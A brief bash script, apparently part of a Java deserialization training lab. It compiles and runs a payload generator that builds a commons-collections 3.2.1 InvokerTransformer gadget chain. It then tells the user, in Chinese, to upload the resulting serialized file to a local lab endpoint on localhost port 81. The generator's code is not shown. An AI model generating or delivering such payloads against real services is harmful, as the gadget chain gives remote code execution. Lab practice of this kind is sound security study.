#!/bin/bash
# class07 — InvokerTransformer
cd "$(dirname "$0")"
javac -cp "../lib/commons-collections-3.2.1.jar" GenPayload.java -d .
java -cp ".:../lib/commons-collections-3.2.1.jar" class07.GenPayload
rm -rf class07
mv *.ser .. 2>/dev/null
echo "🎯 上传 class07.ser 到 http://localhost:81/class07/"
